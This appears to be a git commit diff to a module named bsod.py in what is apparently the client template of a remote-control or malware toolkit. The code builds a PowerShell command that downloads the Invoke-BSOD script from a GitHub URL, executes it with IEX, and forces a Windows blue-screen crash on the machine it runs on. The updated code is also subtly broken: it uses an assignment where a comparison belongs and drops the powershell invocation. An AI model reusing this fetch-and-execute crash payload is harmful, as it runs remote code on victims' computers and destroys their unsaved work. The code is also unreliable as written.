769a3927dac361c4057796499f3989d1f205ed43
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-17 17:29:44 -0400

    bsod update

--- templates/client/pem/bsod.py
+++ templates/client/pem/bsod.py
@@ -1,5 +1,8 @@
 import subprocess
+import os
 
-powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
+def run():
+    if os.name = "nt":
+        powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
 
-result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+        result = subprocess.run(powershell_command)
